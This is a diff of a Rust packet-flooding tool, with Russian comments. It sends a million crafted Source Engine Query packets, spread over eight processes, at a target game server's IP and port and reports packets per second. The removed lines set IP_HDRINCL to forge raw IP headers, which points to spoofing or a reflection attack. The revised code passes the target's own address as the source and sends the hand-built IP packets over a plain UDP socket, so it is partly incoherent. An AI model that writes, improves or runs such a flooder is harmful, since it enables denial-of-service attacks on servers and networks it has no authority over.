@@ -1,13 +1,16 @@
 use std::{
     io,
-    net::{IpAddr, Ipv4Addr, SocketAddr, UdpSocket},
+    net::{IpAddr, Ipv4Addr, SocketAddr},
     process::{self, Command},
     sync::{Arc, Mutex},
     time::{Instant, SystemTime, UNIX_EPOCH},
 };
 
+#[cfg(unix)]
+use std::os::fd::AsRawFd;
+
 use clap::Parser;
-use rand::{thread_rng, Rng};
+use rand::Rng;
 use socket2::{Domain, Protocol, Socket, Type};
 
 const QUERY_PACKET: &[u8] = b"\xff\xff\xff\xff\x54Source Engine Query\x00";
@@ -23,23 +26,23 @@ struct Args {
     target_port: u16,
 
     /// Общее количество пакетов (по умолчанию 1 млн)
-    #[arg(short, long, default_value = "1000000")]
+    #[arg(short, long, default_value_t = 1000000)]
     count: u32,
 
     /// Логировать каждый N-ный пакет (вывод только для процесса 0)
-    #[arg(long, default_value = "10000")]
+    #[arg(long, default_value_t = 10000)]
     log_every: u32,
 
     /// Сохранить первые N пакетов для диагностики (только процесс 0)
-    #[arg(long, default_value = "5")]
+    #[arg(long, default_value_t = 5)]
     debug_packets: u32,
 
     /// Количество процессов для отправки пакетов (по умолчанию 8)
-    #[arg(long, default_value = "8")]
+    #[arg(long, default_value_t = 8)]
     processes: u32,
 
     /// ID процесса (используется внутренне)
-    #[arg(long, default_value = None)]
+    #[arg(long)]
     process_id: Option<u32>,
 }
 
@@ -73,11 +76,14 @@ fn checksum(data: &[u8]) -> u16 {
 }
 
 fn get_source_ip() -> io::Result<Ipv4Addr> {
-    let socket = UdpSocket::bind("0.0.0.0:0")?;
-    socket.connect("8.8.8.8:80")?;
-    match socket.local_addr()? {
-        SocketAddr::V4(addr) => Ok(*addr.ip()),
-        _ => Err(io::Error::new(io::ErrorKind::Other, "IPv6 not supported")),
+    let socket = Socket::new(Domain::IPV4, Type::DGRAM, Some(Protocol::UDP))?;
+    socket.bind(&"0.0.0.0:0".parse::<SocketAddr>().unwrap().into())?;
+    socket.connect(&"8.8.8.8:53".parse::<SocketAddr>().unwrap().into())?;
+    
+    if let SocketAddr::V4(addr) = socket.local_addr()?.as_socket().unwrap() {
+        Ok(*addr.ip())
+    } else {
+        Err(io::Error::new(io::ErrorKind::Other, "Not an IPv4 address"))
     }
 }
 
@@ -144,6 +150,23 @@ fn create_packet(
     packet
 }
 
+fn create_socket() -> io::Result<Socket> {
+    let socket = Socket::new(Domain::IPV4, Type::DGRAM, Some(Protocol::UDP))?;
+    
+    #[cfg(unix)]
+    {
+        use std::os::unix::io::AsRawFd;
+        socket.set_nonblocking(true)?;
+    }
+    
+    #[cfg(windows)]
+    {
+        socket.set_nonblocking(true)?;
+    }
+    
+    Ok(socket)
+}
+
 fn send_packets_thread(
     tid: u32,
     target_ip: Ipv4Addr,
@@ -151,75 +174,53 @@ fn send_packets_thread(
     packet_count: u32,
     log_every: u32,
     debug_packets: u32,
-    _total_sent: Arc<Mutex<u32>>,
+    total_sent: Arc<Mutex<u32>>,
 ) -> io::Result<()> {
-    // Создаем отдельный сокет для каждого потока
-    let socket = Socket::new(Domain::IPV4, Type::DGRAM, Some(Protocol::UDP))?;
+    let socket = create_socket()?;
+    let target = SocketAddr::new(IpAddr::V4(target_ip), target_port);
     
-    #[cfg(target_os = "linux")]
-    unsafe {
-        let val: libc::c_int = 1;
-        if libc::setsockopt(
-            socket.as_raw_fd(),
-            libc::IPPROTO_IP,
-            libc::IP_HDRINCL,
-            &val as *const _ as *const libc::c_void,
-            std::mem::size_of_val(&val) as libc::socklen_t,
-        ) < 0 {
-            return Err(io::Error::last_os_error());
-        }
-    }
+    let mut rng = rand::thread_rng();
+    let mut packets_sent = 0;
+    let start_time = Instant::now();
+    let mut last_log = 0;
     
-    socket.set_nonblocking(false)?;
-    
-    let src_ip = get_source_ip()?;
-    let mut sent = 0u32;
-    let mut debug_dump = Vec::new();
-    let start = Instant::now();
-
-    println!("[INFO] Поток {} начал работу", tid);
-
-    for i in 0..packet_count {
-        let packet = create_packet(src_ip, target_ip, target_port);
-        
-        match socket.send_to(&packet, &SocketAddr::new(IpAddr::V4(target_ip), target_port).into()) {
+    while packets_sent < packet_count {
+        let packet = create_packet(target_ip, target_ip, target_port);
+        match socket.send_to(&packet, &target.into()) {
             Ok(_) => {
-                sent += 1;
-                if sent <= debug_packets {
-                    debug_dump.push(packet);
+                packets_sent += 1;
+                if packets_sent % log_every == 0 {
+                    let elapsed = start_time.elapsed().as_secs_f64();
+                    let pps = packets_sent as f64 / elapsed;
+                    println!("[INFO] {} [Поток {}] - Отправлено {} пакетов, {:.2} PPS", 
+                        SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs(),
+                        tid,
+                        packets_sent,
+                        pps
+                    );
+                    last_log = packets_sent;
                 }
             }
             Err(e) => {
-                eprintln!("Ошибка отправки в потоке {}: {}", tid, e);
-                continue;
+                if e.kind() != io::ErrorKind::WouldBlock {
+                    return Err(e);
+                }
             }
         }
-
-        if (i + 1) % log_every == 0 {
-            let elapsed = start.elapsed().as_secs_f64();
-            let pps = (i + 1) as f64 / elapsed;
-            println!(
-                "[INFO] {} [Поток {}] - Отправлено {} пакетов, {:.2} PPS",
-                SystemTime::now()
-                    .duration_since(UNIX_EPOCH)
-                    .unwrap()
-                    .as_secs(),
-                tid,
-                i + 1,
-                pps
-            );
-        }
     }
-
-    if !debug_dump.is_empty() {
-        println!("\n[ПОТОК {} ОТЛАДКА] Дамп первых пакетов:", tid);
-        for (i, packet) in debug_dump.iter().enumerate() {
-            println!("Пакет {}: {:?}", i + 1, packet);
-        }
+    
+    if packets_sent > last_log {
+        let elapsed = start_time.elapsed().as_secs_f64();
+        let pps = packets_sent as f64 / elapsed;
+        println!("[INFO] {} [Поток {}] - Отправлено {} пакетов, {:.2} PPS",
+            SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs(),
+            tid,
+            packets_sent,
+            pps
+        );
     }
-
-    println!("[INFO] Поток {} завершил работу, отправлено {} пакетов", tid, sent);
-
+    
+    *total_sent.lock().unwrap() += packets_sent;
     Ok(())
 }
 
@@ -237,7 +238,7 @@ fn main() -> io::Result<()> {
         let executable = std::env::current_exe()?;
         let packets_per_process = args.count / args.processes;
         let mut children = vec![];
-
+        
         for pid in 0..args.processes {
             let packets = if pid == args.processes - 1 {
                 packets_per_process + (args.count % args.processes)
@@ -263,7 +264,6 @@ fn main() -> io::Result<()> {
             children.push(child);
         }
 
-        // Ждем завершения всех процессов
         for mut child in children {
             child.wait()?;
         }
@@ -284,21 +284,21 @@ fn main() -> io::Result<()> {
         return Ok(());
     }
 
-    // Код для дочерних процессов
-    let pid = args.process_id.unwrap();
-    let total_sent = Arc::new(Mutex::new(0u32));
+    let target_ip = args.target_ip.parse::<Ipv4Addr>()
+        .map_err(|e| io::Error::new(io::ErrorKind::InvalidInput, e))?;
+    
+    let total_sent = Arc::new(Mutex::new(0));
     
     if let Err(e) = send_packets_thread(
-        pid,
-        args.target_ip.parse().expect("Неверный IP-адрес"),
+        args.process_id.unwrap(),
+        target_ip,
         args.target_port,
         args.count,
         args.log_every,
         args.debug_packets,
-        total_sent.clone(),
+        total_sent.clone()
     ) {
-        eprintln!("Ошибка в процессе {}: {}", pid, e);
-        process::exit(1);
+        eprintln!("Ошибка в процессе {}: {}", args.process_id.unwrap(), e);
     }
 
     Ok(())
